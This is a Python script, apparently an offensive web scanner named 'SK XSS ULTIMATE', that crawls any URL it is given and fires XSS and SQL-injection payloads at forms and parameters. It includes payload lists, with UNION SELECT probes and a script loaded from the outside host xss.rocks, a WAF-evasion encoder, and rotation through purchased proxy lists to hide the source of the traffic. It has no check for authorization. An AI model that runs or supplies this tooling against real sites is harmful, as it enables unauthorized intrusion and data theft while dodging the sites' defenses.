#!/usr/bin/env python3
'''
SK XSS ULTIMATE - Web Vulnerability Scanner
Developer: Sheikh Sabbir
Version: 2.1 Ultimate + Proxy Rotator
Features: XSS + SQLi + WAF Bypass + JS Rendering + Proxy Rotation
'''
import requests
import re
import time
import random
import urllib.parse
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import warnings
warnings.filterwarnings("ignore")

# ============ COLOR CODES ============
W = "\033[93m"
G = "\033[92m"
R = "\033[91m"
B = "\033[94m"
C = "\033[96m"
Y = "\033[93m"
N = "\033[0m"
P = "\033[95m"
# ===================================

# ============ BANNER ============
BANNER = G + r"""
   _____  _    __     __  _____   _____   _____ 
  / ____|| |   \ \   / / |  __ \ / ____| / ____|
 | (___  | |    \ \_/ /  | |__) | (___  | (___  
  \___ \ | |     \   /   |  _  /  \___ \  \___ \ 
  ____) || |____  | |    | | \ \  ____) | ____) |
 |_____/ |______| |_|    |_|  \_\|_____/ |_____/ 
""" + N + C + """
         SK XSS ULTIMATE v2.1
         Developer: Sheikh Sabbir
         Features: XSS | SQLi | WAF Bypass | JS Rendering | Proxy Rotator
         "Fully Automated - Just Enter URL"
""" + N
# ===================================

# ============ PROXY LOADER ============
class ProxyManager:
    def __init__(self, proxy_files):
        self.proxies = []
        self.current_index = 0
        for file in proxy_files:
            try:
                with open(file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            if '@' in line:
                                auth, addr = line.split('@')
                                proxy_url = f"http://{addr}"
                                self.proxies.append({
                                    'http': proxy_url,
                                    'https': proxy_url
                                })
                            else:
                                proxy_url = f"http://{line}"
                                self.proxies.append({
                                    'http': proxy_url,
                                    'https': proxy_url
                                })
            except Exception as e:
                print(f"{Y}[!] Error loading {file}: {e}{N}")
        
        seen = set()
        unique = []
        for p in self.proxies:
            key = p['http']
            if key not in seen:
                seen.add(key)
                unique.append(p)
        self.proxies = unique
        print(f"{G}[+] Loaded {len(self.proxies)} unique proxies{N}")
    
    def get_next(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return proxy

# ============ PAYLOAD SETS ============
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<iframe src=\"javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<math href=\"javascript:alert(1)\">click</math>",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<isindex action=\"javascript:alert(1)\" type=image>",
    "<IMG SRC=javascript:alert(1)>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<IMG SRC=\"javascript:alert(1)\">",
    "<IMG SRC=`javascript:alert(1)`>",
    "<BODY ONLOAD=alert(1)>",
    "<BODY BACKGROUND=\"javascript:alert(1)\">",
    "<FRAMESET><FRAME SRC=\"javascript:alert(1)\"></FRAMESET>",
    "<IFRAME SRC=\"javascript:alert(1)\"></IFRAME>",
    "<META HTTP-EQUIV=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<META HTTP-EQUIV=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>alert(1)//<script>",
    "<script>alert(1)<!--</script>",
    "<script>alert(1)-->",
    "<<script>alert(1)</script>",
    "<script/src=//xss.rocks/1.js>",
    "<script/src=data:text/javascript,alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<img%0asrc=x%0aonerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    "<body onscroll=alert(1)><div style=height:1000px></div>",
    "<input onfocus=alert(1) autofocus>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
]

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "1' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' AND '1'='1",
    "' AND '1'='1' -- ",
    "admin' -- ",
    "admin' #",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT @@version--",
    "' UNION SELECT database()--",
    "' UNION SELECT user()--",
]

def waf_bypass_payload(payload):
    encodings = [
        lambda p: p,
        lambda p: urllib.parse.quote(p),
        lambda p: urllib.parse.quote_plus(p),
        lambda p: p.replace("<", "%3C").replace(">", "%3E"),
        lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
        lambda p: p.upper(),
        lambda p: p.lower(),
        lambda p: p.replace("script", "scRiPt"),
        lambda p: p.replace("alert", "aLerT"),
        lambda p: p.replace(" ", "%0a"),
        lambda p: p.replace(" ", "%0d"),
        lambda p: p.replace(" ", "%09"),
        lambda p: p.replace(" ", "%20"),
    ]
    return random.choice(encodings)(payload)

def check_sqli(url, params, proxy_manager, method="GET"):
    vuln_params = []
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                proxy = proxy_manager.get_next() if proxy_manager else None
                if method.upper() == "GET":
                    resp = requests.get(url, params=test_params, timeout=5, verify=False, proxies=proxy)
                else:
                    resp = requests.post(url, data=test_params, timeout=5, verify=False, proxies=proxy)
                
                error_patterns = [
                    "sql", "mysql", "syntax error", "unclosed quotation",
                    "you have an error", "warning", "odbc", "driver",
                    "db2", "postgresql", "oracle", "microsoft ole db"
                ]
                if any(p in resp.text.lower() for p in error_patterns):
                    vuln_params.append((param, payload, method))
                    print(f"{R}[!] SQLi Found: {param} = {payload}{N}")
                    break
            except:
                continue
    return vuln_params

def check_xss(url, params, proxy_manager, method="GET"):
    vuln_params = []
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = waf_bypass_payload(payload)
            try:
                proxy = proxy_manager.get_next() if proxy_manager else None
                if method.upper() == "GET":
                    resp = requests.get(url, params=test_params, timeout=5, verify=False, proxies=proxy)
                else:
                    resp = requests.post(url, data=test_params, timeout=5, verify=False, proxies=proxy)
                
                if payload in resp.text or urllib.parse.quote(payload) in resp.text:
                    vuln_params.append((param, payload, method))
                    print(f"{R}[!] XSS Found: {param} = {payload}{N}")
                    break
            except:
                continue
    return vuln_params

def render_js(url):
    try:
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        driver = webdriver.Chrome(options=options)
        driver.get(url)
        time.sleep(2)
        html = driver.page_source
        driver.quit()
        return html
    except:
        print(f"{Y}[!] Selenium not installed. Install: pip install selenium{N}")
        return None

def extract_links(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    links = set()
    for tag in soup.find_all(["a", "form"]):
        if tag.name == "a" and tag.get("href"):
            href = urljoin(base_url, tag["href"])
            if href.startswith(("http://", "https://")):
                links.add(href)
        elif tag.name == "form":
            action = tag.get("action")
            if action:
                action_url = urljoin(base_url, action)
                if action_url.startswith(("http://", "https://")):
                    links.add(action_url)
    return links

def get_params(url):
    parsed = urlparse(url)
    params = {}
    if parsed.query:
        for p in parsed.query.split("&"):
            if "=" in p:
                k, v = p.split("=", 1)
                params[k] = v
    return params

def scan_url(url, proxy_manager, depth=2):
    print(f"{G}[+] Scanning: {url}{N}")
    
    try:
        proxy = proxy_manager.get_next() if proxy_manager else None
        resp = requests.get(url, timeout=5, verify=False, proxies=proxy)
        html = resp.text
    except:
        print(f"{R}[-] Failed to connect{N}")
        return
    
    if "<script" in html.lower() and ("react" in html.lower() or "angular" in html.lower()):
        print(f"{Y}[*] JS-heavy page detected. Rendering with Selenium...{N}")
        rendered = render_js(url)
        if rendered:
            html = rendered
    
    params = get_params(url)
    soup = BeautifulSoup(html, "html.parser")
    
    for form in soup.find_all("form"):
        action = form.get("action", "")
        form_url = urljoin(url, action)
        method = form.get("method", "get").lower()
        form_params = {}
        for input_tag in form.find_all(["input", "textarea"]):
            name = input_tag.get("name")
            if name:
                form_params[name] = "test"
        if form_params:
            print(f"{C}[*] Testing form: {form_url} (method: {method}){N}")
            if method == "get":
                check_xss(form_url, form_params, proxy_manager, "GET")
                check_sqli(form_url, form_params, proxy_manager, "GET")
            else:
                check_xss(form_url, form_params, proxy_manager, "POST")
                check_sqli(form_url, form_params, proxy_manager, "POST")
    
    if params:
        print(f"{C}[*] Testing URL parameters: {list(params.keys())}{N}")
        check_xss(url, params, proxy_manager, "GET")
        check_sqli(url, params, proxy_manager, "GET")
    
    if depth > 0:
        links = extract_links(html, url)
        for link in list(links)[:5]:
            scan_url(link, proxy_manager, depth - 1)

def interactive():
    print(BANNER)
    
    proxy_files = [
        "proxyscrape_premium_http_proxies.txt",
        "proxies.txt",
        "proxyscrape_premium_http_proxies (1).txt"
    ]
    proxy_manager = ProxyManager(proxy_files)
    
    while True:
        print(f"{G}{'='*50}{N}")
        target = input(f"{Y}[?] Enter URL (or 'exit' to quit): {N}")
        if target.lower() == "exit":
            print(f"{R}[!] Exiting...{N}")
            break
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        scan_url(target, proxy_manager)

if __name__ == "__main__":
    interactive()
